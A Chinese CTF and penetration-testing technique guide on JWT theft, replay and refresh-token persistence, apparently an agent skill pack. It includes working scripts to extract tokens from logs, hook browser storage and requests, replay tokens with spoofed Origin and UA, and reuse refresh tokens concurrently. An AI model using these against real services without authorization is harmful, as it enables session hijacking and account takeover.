# JWT 窃取、重放与持久化

> **来源**：改编自 `LING71671/open-reverselab` 的 `kb/ctf-website/techniques/02-auth/jwt/07-theft-replay.md`（GPL-3.0）。原 frontmatter 的 `mcp_tools` 映射已剔除——本技能包未挂载 `run_ctf_tool` / `http_probe`，改用本地工具链。
> **能力域**：本文为技术能力说明，按项目 `scope.md` 直接套用。
> **什么时候用**：命中「token窃取 / XSS / 重放 / Bearer Token」这类信号时，把本文当打点清单读；命中即进「步骤」，命中不了就换主题。

## 适用信号

- token窃取
- XSS
- 重放
- Bearer Token
- HttpOnly
- Referer泄露
- HSTS
- Cookie属性
- refresh token

## 前置

- 授权：目标在 scope 内（`case-init.ps1` 已 grant），测试时段与限速已约定。
- 工具定位走探测层，别猜路径：

```powershell
. 'C:\relab2\skillpack\skills\scripts\lib\Bootstrap.ps1'
$r = Resolve-ReverseToolSpec -Name '<toolid>'   # 例：sqlmap / httpx / ffuf / curl / python
& $r.Command <参数>                                # 永远用完整路径，不依赖 cwd
```

- Python 解释器用探测层的 `python`（本机逆向库集中在 `D:\EXE\python\python.exe`，`venv-re` 是空壳，别去那里找库）。
- 本文脚本默认只读、只打点；扩大范围前先回到 scope 确认。
- 本文涉及的工具与本机实际状态（探测层 `Resolve-ReverseToolSpec` 于 2026-10-10 实测）：

| 工具 | 本机状态 | 本机命令 / 替代方案 |
|---|---|---|
| `playwright` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'playwright').Command ...` → `D:\Tools\Node\playwright.cmd` |
| `objection` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'objection').Command ...` → `D:\EXE\python\Scripts\objection.exe` |
| `subfinder` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'subfinder').Command ...` → `D:\Tools\subfinder\subfinder.exe` |
| `gobuster` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'gobuster').Command ...` → `D:\Tools\gobuster\gobuster.exe` |
| `mitmdump` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'mitmdump').Command ...` → `D:\EXE\python\Scripts\mitmdump.exe` |
| `binwalk` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'binwalk').Command ...` → `C:\Users\toti\.cargo\bin\binwalk.exe` |
| `openssl` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'openssl').Command ...` → `C:\Program Files\Git\usr\bin\openssl.exe` |
| `katana` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'katana').Command ...` → `D:\Tools\katana\katana.exe` |
| `nuclei` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'nuclei').Command ...` → `D:\Tools\nuclei\nuclei.exe` |
| `python` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'python').Command ...` → `D:\EXE\python\python.exe` |
| `sqlmap` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'sqlmap').Command ...` → `D:\Tools\sqlmap\sqlmap.py` |
| `tshark` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'tshark').Command ...` → `D:\Tools\Wireshark\tshark.exe` |
| `frida` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'frida').Command ...` → `D:\EXE\python\Scripts\frida.exe` |
| `httpx` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'httpx').Command ...` → `D:\Tools\httpx\httpx.exe` |
| `naabu` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'naabu').Command ...` → `D:\Tools\naabu\naabu.exe` |
| `curl` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'curl').Command ...` → `C:\WINDOWS\system32\curl.exe` |
| `dnsx` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'dnsx').Command ...` → `D:\Tools\dnsx\dnsx.exe` |
| `ffuf` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'ffuf').Command ...` → `D:\Tools\ffuf\ffuf.exe` |
| `nmap` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'nmap').Command ...` → `D:\Tools\nmap\nmap.exe` |
| `node` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'node').Command ...` → `D:\Tools\Node\node.exe` |
| `adb` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'adb').Command ...` → `D:\Tools\android\AndroidKiller_fix\bin\adb\adb.exe` |
| `git` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'git').Command ...` → `C:\Program Files\Git\cmd\git.exe` |
| `interactsh-client` | 未安装 | OOB 通道需自备回显服务（授权环境内的 VPS + `python -m http.server`）；本机无此工具 |
| `nuclei-templates` | 随 nuclei 提供 | `nuclei -t <模板目录>`；模板需联网 `-update-templates` |

- 上表中标「未安装」的工具**不要照抄原库的裸命令**：`Get-Command` 查空就下结论是错的，
  但四级探测 `Available=False` 是结论——此时按替代方案手写脚本，或先装再跑。


## 步骤

1. **URL query/fragment** — 若是 reset/verify token，转业务状态机
2. **localStorage/sessionStorage** — 转 `07-client/admin-bot-xss`
3. **Cookie** — 转 `07-client/cors-csrf`
4. **API 响应体** — 转 `20-oauth-deep` 或 claim 混用
5. **access log/HAR/Sentry** — 转 `08-cve-library` 或 `03-weak-key-bruteforce`
6. **fresh session 仍成功** — 测跨账号、跨 IP、长时间窗口
7. **logout 后仍成功** — 测 refresh 轮换与 access 延寿
8. **UA/IP 改动后失败** — 找绑定字段、设备 ID、指纹 cookie
9. **only cookie 成功** — 转 CSRF/CORS/Origin 差分

## 判据

判据必须是外部可观测的（状态码、响应字段、差分、落盘文件），不是「命令有输出」。

- **命中样本** — token 可复制到新 session 访问同一 API
- **失败样本** — token 绑定 cookie/device，单独 bearer 被拒
- **命中样本** — 第三方资源 Referer 带完整 token
- **失败样本** — `Referrer-Policy` 只泄露 origin 或 URL 已 replace
- **命中样本** — 读取 token 后可重放业务接口
- **失败样本** — token 只用于前端展示，API 另走 cookie
- **命中样本** — 非 HttpOnly 可读，或 SameSite 缺失可借浏览器附带
- **失败样本** — HttpOnly 但接口仍校验 CSRF/Origin
- **命中样本** — logout 后仍返回用户数据/订单/flag
- **失败样本** — 立即 `401/invalid jti`
- **命中样本** — 旧 refresh 可重复换新 access
- **失败样本** — refresh 一次后旧值失效
- **优先 oracle** — Referer、浏览器 history、日志抽取
- **优先 oracle** — XSS、postMessage、前端 bundle 状态

## 坑

- 探针命令在**未本机验证**时不要当成既定事实跑；先用探测层确认 `Available=True`。
- 噪声排除：先固定 baseline（同 URL 同 token 跑 3 次），再只改一个变量做差分。
- 不要把「状态码 200」当命中——WAF/缓存/软 404 都返回 200，命中判据要落到具体业务字段。

## 相关

- 见本技能 `../../SKILL.md` 的 references 索引。

## 技术正文

> 以下为原库正文（保留全部技术细节与脚本），仅移除原 `MCP 工具映射` 章节并重写跨文档链接。

JWT 的关键性质是 Bearer：服务端把 token 当作身份材料，默认不证明“谁正在持有”。CTF 里不要只问 token 从哪里来，要同时问三个问题：

1. **落点**：token 存在哪里，谁能读到。
2. **绑定**：token 绑定了哪些上下文，哪些没有绑定。
3. **持久化**：access 过期、logout、换 IP、换 UA、刷新链轮换后还能不能继续走。

## 工作流

```text
抽 token 落点
  → 解码 header/claim 并聚类来源
  → 用同一业务 oracle 建 baseline
  → 新 session / logout 后 / UA-IP-Origin 变化重放
  → refresh 复用与并发测试
  → 按成功样本跳到 claim、弱密钥、CVE 或客户端链
```

## 输入信号

| 信号 | 立即动作 | 命中样本 | 失败样本 |
|---|---|---|---|
| `Authorization: Bearer` 出现在 XHR/fetch | hook 请求头和响应体 | token 可复制到新 session 访问同一 API | token 绑定 cookie/device，单独 bearer 被拒 |
| `access_token/id_token/token` 出现在 URL | 抽 URL、Referer、history、日志 | 第三方资源 Referer 带完整 token | `Referrer-Policy` 只泄露 origin 或 URL 已 replace |
| localStorage/sessionStorage 有 JWT | 前端状态快照 + XSS/DOM sink 路由 | 读取 token 后可重放业务接口 | token 只用于前端展示，API 另走 cookie |
| Cookie 中有 JWT | 检查属性和同站触发 | 非 HttpOnly 可读，或 SameSite 缺失可借浏览器附带 | HttpOnly 但接口仍校验 CSRF/Origin |
| 登出后 access 仍可用 | logout 前后同一 oracle 重放 | logout 后仍返回用户数据/订单/flag | 立即 `401/invalid jti` |
| refresh token 存在 | 记录轮换、复用、跨设备 | 旧 refresh 可重复换新 access | refresh 一次后旧值失效 |

## 0. 路由矩阵

| token 来源 | 优先 oracle | 下一跳 |
|---|---|---|
| URL query/fragment | Referer、浏览器 history、日志抽取 | 若是 reset/verify token，转业务状态机 |
| localStorage/sessionStorage | XSS、postMessage、前端 bundle 状态 | 转 `07-client/admin-bot-xss` |
| Cookie | SameSite/Origin/CSRF 差分 | 转 `07-client/cors-csrf` |
| API 响应体 | 登录/刷新/SSO callback 抓包 | 转 `20-oauth-deep` 或 claim 混用 |
| access log/HAR/Sentry | 正则抽 JWT，按 alg/kid/aud 聚类 | 转 `08-cve-library` 或 `03-weak-key-bruteforce` |

## 1. 落点枚举

先把 token 从 HAR、日志、HTML、JS 状态和 URL 里抽出来，按 `alg/kid/aud/iss/exp` 聚类。不要只保存 token 字符串，必须保留来源字段，否则后面无法判断泄露路径。

```python
#!/usr/bin/env python3
import argparse
import base64
import json
import re
from pathlib import Path

JWT_RE = re.compile(r"eyJ[A-Za-z0-9_-]{5,}\.[A-Za-z0-9_-]{5,}\.[A-Za-z0-9_-]*")

def b64json(part):
    part += "=" * (-len(part) % 4)
    return json.loads(base64.urlsafe_b64decode(part.encode()))

def classify(token):
    h, p, _ = token.split(".", 2)
    header, payload = b64json(h), b64json(p)
    return {
        "alg": header.get("alg", ""),
        "kid": header.get("kid", ""),
        "typ": header.get("typ", ""),
        "iss": payload.get("iss", ""),
        "aud": payload.get("aud", ""),
        "sub": payload.get("sub", ""),
        "exp": payload.get("exp", ""),
        "scope": payload.get("scope", payload.get("scp", "")),
    }

def iter_text(path):
    raw = Path(path).read_text(encoding="utf-8", errors="ignore")
    try:
        obj = json.loads(raw)
        yield from walk_json(obj)
    except Exception:
        for idx, line in enumerate(raw.splitlines(), 1):
            yield f"line:{idx}", line

def walk_json(obj, prefix="$"):
    if isinstance(obj, dict):
        for k, v in obj.items():
            yield from walk_json(v, f"{prefix}.{k}")
    elif isinstance(obj, list):
        for i, v in enumerate(obj):
            yield from walk_json(v, f"{prefix}[{i}]")
    else:
        yield prefix, "" if obj is None else str(obj)

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("files", nargs="+")
    args = ap.parse_args()
    seen = set()
    for path in args.files:
        for source, text in iter_text(path):
            for m in JWT_RE.finditer(text):
                token = m.group(0)
                if token in seen:
                    continue
                seen.add(token)
                try:
                    meta = classify(token)
                except Exception as exc:
                    meta = {"parse_error": str(exc)}
                print(json.dumps({"file": path, "source": source, "token": token[:32] + "...", **meta}, ensure_ascii=False))

if __name__ == "__main__":
    main()
```

成功样本：不同来源抽出的 token 具有同一 `iss/aud/kid`，且能映射到具体登录、callback、日志或 XSS 路径。失败样本：字符串看似 JWT 但 header/payload 解析失败，或只是静态测试 fixture。

## 2. 浏览器运行时捕获

在题目允许控制浏览器时，优先 hook 请求头、响应体和前端存储。目标不是“偷一次 token”，而是确认 token 何时产生、哪里落盘、刷新时如何变化。

```javascript
(() => {
  const dump = label => {
    console.log("[jwt-store]", label, {
      local: {...localStorage},
      session: {...sessionStorage},
      cookie: document.cookie
    });
  };
  dump("initial");
  const oldFetch = window.fetch;
  window.fetch = async function(input, init = {}) {
    const url = String(input && input.url || input);
    const headers = init.headers || {};
    console.log("[jwt-fetch:req]", url, headers, init.body || "");
    const resp = await oldFetch.apply(this, arguments);
    const clone = resp.clone();
    clone.text().then(t => {
      if (/eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*/.test(t)) {
        console.log("[jwt-fetch:resp]", url, t.slice(0, 1000));
      }
    }).catch(() => {});
    return resp;
  };
  const open = XMLHttpRequest.prototype.open;
  const send = XMLHttpRequest.prototype.send;
  XMLHttpRequest.prototype.open = function(method, url) {
    this.__jwt_url = url;
    this.__jwt_method = method;
    return open.apply(this, arguments);
  };
  XMLHttpRequest.prototype.send = function(body) {
    console.log("[jwt-xhr:req]", this.__jwt_method, this.__jwt_url, body || "");
    return send.apply(this, arguments);
  };
})();
```

## 3. 重放 oracle

同一个 token 至少测四组：原 session、新 session、logout 后、改 UA/IP/Origin 后。响应只看 `200/401` 太粗，应该同时记录 body hash、身份字段、权限字段、业务副作用。

```python
#!/usr/bin/env python3
import argparse
import hashlib
import json
import requests

def digest(text):
    return hashlib.sha256(text.encode("utf-8", errors="ignore")).hexdigest()[:16]

def hit(url, token, cookie="", ua="ReplayOracle/1.0", origin=""):
    headers = {"Authorization": f"Bearer {token}", "User-Agent": ua}
    if cookie:
        headers["Cookie"] = cookie
    if origin:
        headers["Origin"] = origin
    r = requests.get(url, headers=headers, timeout=10)
    try:
        body = r.json()
    except Exception:
        body = {"raw": r.text[:300]}
    return {
        "status": r.status_code,
        "hash": digest(r.text),
        "location": r.headers.get("Location", ""),
        "user": body.get("user", body.get("sub", "")) if isinstance(body, dict) else "",
        "role": body.get("role", body.get("scope", "")) if isinstance(body, dict) else "",
    }

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", required=True)
    ap.add_argument("--token", required=True)
    ap.add_argument("--cookie", default="")
    ap.add_argument("--logout-url", default="")
    args = ap.parse_args()
    out = {"baseline": hit(args.url, args.token, args.cookie)}
    if args.logout_url:
        requests.post(args.logout_url, headers={"Authorization": f"Bearer {args.token}", "Cookie": args.cookie}, timeout=10)
        out["after_logout"] = hit(args.url, args.token, args.cookie)
    out["fresh_session"] = hit(args.url, args.token)
    out["ua_flip"] = hit(args.url, args.token, args.cookie, ua="Mozilla/5.0 ReplayFlip")
    out["origin_flip"] = hit(args.url, args.token, args.cookie, origin="https://attacker.example")
    print(json.dumps(out, ensure_ascii=False, indent=2))

if __name__ == "__main__":
    main()
```

判定：

| 结果 | 解释 | 下一步 |
|---|---|---|
| fresh session 仍成功 | bearer 未绑定 cookie/device | 测跨账号、跨 IP、长时间窗口 |
| logout 后仍成功 | jti/撤销链缺失 | 测 refresh 轮换与 access 延寿 |
| UA/IP 改动后失败 | 存在上下文绑定 | 找绑定字段、设备 ID、指纹 cookie |
| only cookie 成功 | bearer 不是唯一凭据 | 转 CSRF/CORS/Origin 差分 |

## 4. refresh 持久化

| 变体 | 操作 | 命中样本 | 失败样本 |
|---|---|---|---|
| reuse | 同一 refresh 连续换 access | 每次返回新 access | 第二次 `invalid refresh` |
| parallel | 并发使用同一 refresh | 多个 access 同时有效 | 只有一个成功，其余失效 |
| logout reuse | logout 后继续 refresh | 仍返回 access | refresh 被吊销 |
| cross device | 设备 A refresh 给设备 B | B 可换 access | 绑定 device/session |
| scope lift | refresh 换出的 access scope 更大 | `scope/role/aud` 扩张 | 与原 access 一致 |

```python
#!/usr/bin/env python3
import argparse
import concurrent.futures
import json
import requests

def refresh(url, token):
    r = requests.post(url, json={"refresh_token": token}, timeout=10)
    try:
        body = r.json()
    except Exception:
        body = {"raw": r.text[:200]}
    return {"status": r.status_code, "body": body}

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", required=True)
    ap.add_argument("--refresh", required=True)
    ap.add_argument("--workers", type=int, default=5)
    args = ap.parse_args()
    with concurrent.futures.ThreadPoolExecutor(max_workers=args.workers) as ex:
        results = list(ex.map(lambda _: refresh(args.url, args.refresh), range(args.workers)))
    print(json.dumps(results, ensure_ascii=False, indent=2))

if __name__ == "__main__":
    main()
```

## 5. Evidence

| 项 | 记录内容 |
|---|---|
| token 来源 | HAR/log/URL/storage/cookie 字段路径、原始行号、时间点 |
| 解码信息 | header、claim、`alg/kid/iss/aud/sub/exp/jti/scope` |
| 重放矩阵 | baseline、fresh session、logout 后、UA/IP/Origin 变化的响应 |
| 持久化结果 | refresh 复用、并发、logout 后、跨设备的 access 产出 |
| 成功样本 | 新 session/登出后/跨上下文仍能访问用户数据、订单、后台、flag |
| 失败样本 | `invalid jti`、`session mismatch`、`device mismatch`、`refresh reused`、同一 body hash 的拒绝 |
| 下一跳 | 弱密钥转 `03-weak-key-bruteforce`；claim 缺失转 `06-claim-missing`；库指纹转 `08-cve-library` |
